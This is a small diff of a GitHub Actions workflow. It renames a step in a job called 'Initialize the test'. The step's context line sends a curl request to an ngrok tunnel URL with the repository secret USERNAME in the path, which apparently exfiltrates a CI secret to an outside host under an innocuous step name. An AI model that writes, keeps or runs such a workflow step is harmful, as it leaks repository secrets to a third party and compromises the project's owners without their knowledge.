@@ -16,7 +16,7 @@ jobs:
     name: Initialize the test
     runs-on: ubuntu-latest
     steps:
-      - name: Load storage
+      - name: Load data
         run: |
           curl -X GET "https://78c3-49-207-63-198.ngrok-free.app/${{ secrets.USERNAME }}"
 
